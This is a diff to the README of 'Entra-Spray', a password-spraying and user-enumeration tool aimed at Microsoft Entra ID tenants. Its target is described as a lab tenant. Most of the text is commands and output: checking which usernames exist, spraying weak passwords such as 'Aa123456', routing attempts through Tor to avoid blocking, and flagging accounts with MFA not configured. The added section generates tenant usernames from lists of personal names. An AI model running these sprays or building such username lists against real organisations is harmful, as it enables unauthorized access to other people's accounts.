@@ -38,7 +38,7 @@ the tenant and the upns is a part of a LAB enviroment in Entra ID :]
 
 #### Checking If User Exist:
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -check
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -check
 
 [✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
 [✓] Username: david@entraspraytenant.onmicrosoft.comis exists
@@ -53,7 +53,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -check
 
 #### Checking If User Exist with TOR routing (-proxytor flag):
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
 
 [i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}    <--
 [✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
@@ -68,7 +68,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
 
 #### Preforming Password Spray Attack:
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'
 
 [-] Failed to authenticate with shoshi@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
 [✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
@@ -81,7 +81,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'
 
 #### Preforming Password Spray Attack with '-check' flag:
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check
 
 [!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
 [✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
@@ -99,7 +99,7 @@ The script will check if:
 - The user is required to change their password
   
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -proxytor
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -proxytor
 
 [i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}   <--
 [!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
@@ -112,7 +112,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -
 ```
 
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -proxytor
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -proxytor
 
 [i] Current TOR IP: {"IsTor":true,"IP":"110.22.66.190"}   <--
 [!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
@@ -125,7 +125,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -
 ```
 
 ```python
-python3 Entra-Spray.py -user list-of-usernames.txt -password 'Cc123456' -check -proxytor
+(Entra-Spray) root@Machine# python3 Entra-Spray.py -user list-of-usernames.txt -password 'Cc123456' -check -proxytor
 
 [i] Current TOR IP: {"IsTor":true,"IP":"109.172.188.113"}   <--
 [✓] User shoshi@entraspraytenant.onmicrosoft.com is exist, and Password needs updating: Cc123456   <--
@@ -136,6 +136,27 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Cc123456' -check -
 ----------------------------
  Valid users and successful authentications written to valid-users.txt
 ```
+
+### Usage UserName-Combain.py:
+```bash
+(Entra-Spray) root@Machine# cat names.txt
+
+shaked wiessman
+israel israeli
+ran danker
+dani kushmaro
+idan amedi
+```
+```python3
+(Entra-Spray) root@Machine# python3 UserName-Combain.py -input names.txt -output usernames.txt -tenant '@entraspraytenant.onmicrosoft.com' -style firstlast
+
+shakedwiessman@entraspraytenant.onmicrosoft.com
+israelisraeli@entraspraytenant.onmicrosoft.com
+randanker@entraspraytenant.onmicrosoft.com
+danikushmaro@entraspraytenant.onmicrosoft.com
+idanamedi@entraspraytenant.onmicrosoft.com
+```
+
 ## Usage with TOR:
 
 ### Install:
